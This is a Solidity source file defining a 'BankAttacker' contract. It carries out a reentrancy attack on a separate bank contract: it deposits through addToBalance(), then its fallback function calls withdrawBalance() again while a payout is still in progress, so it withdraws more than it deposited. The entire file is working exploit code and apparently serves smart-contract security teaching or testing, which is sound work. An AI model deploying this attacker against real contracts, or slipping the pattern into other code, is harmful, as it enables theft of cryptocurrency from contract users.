pragma solidity 0.4.25;

contract BankAttacker{

     bool public is_attack;
     address public bankAddress;

     constructor(address _bankAddress, bool _is_attack) public {
         bankAddress = _bankAddress;
         is_attack = _is_attack;
     }

     function() public payable{
         if(is_attack==true)
         {
             is_attack=false;
             if(bankAddress.call(bytes4(keccak256("withdrawBalance()"))) == false) {
                 revert();
             }
        }
     }

     function  deposit() public payable{
         if(bankAddress.call.value(msg.value).gas(20764)(bytes4(keccak256("addToBalance()"))) == false) {
             revert();
         }
     }

     function  withdraw() public {
         if(bankAddress.call.gas(200000)(bytes4(keccak256("withdrawBalance()"))) == false) {
             revert();
         }
     }

     function contractHoldEth() public view returns (uint256){
         return address(this).balance;
     }

     function withdrawBalance() public {
         require(msg.sender.send(address(this).balance));
     }
 }